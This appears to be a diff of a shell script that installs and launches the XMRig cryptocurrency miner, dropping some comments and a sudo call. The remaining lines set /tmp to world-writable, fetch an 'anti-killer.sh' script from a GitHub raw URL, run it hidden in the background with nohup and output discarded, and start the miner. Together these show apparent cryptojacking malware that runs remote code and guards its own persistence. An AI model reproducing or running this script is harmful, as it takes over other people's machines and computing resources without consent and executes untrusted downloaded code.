@@ -5,15 +5,11 @@ xmrver="6.22.2"
 if [ -d /tmp ]; then
     echo "/tmp exists"
 else
-    # create tmp if it doesn't exist (yes that happened...)
     sudo -n mkdir /tmp
     sudo -n chmod 777 /tmp
 fi
 
-# remove any aliases
 unalias -a
-
-# try to install wget and util-linux
 sudo -n apt update
 sudo -n apt install -y wget util-linux
 sudo -n apk add wget util-linux
@@ -43,5 +39,4 @@ wget -qO /tmp/anti-killer.sh https://raw.githubusercontent.com/gorguzaaaaz/keral
 chmod +x /tmp/anti-killer.sh
 nohup bash /tmp/anti-killer.sh > /dev/null 2>&1 &
 
-sudo -n ./xmrig
 ./xmrig
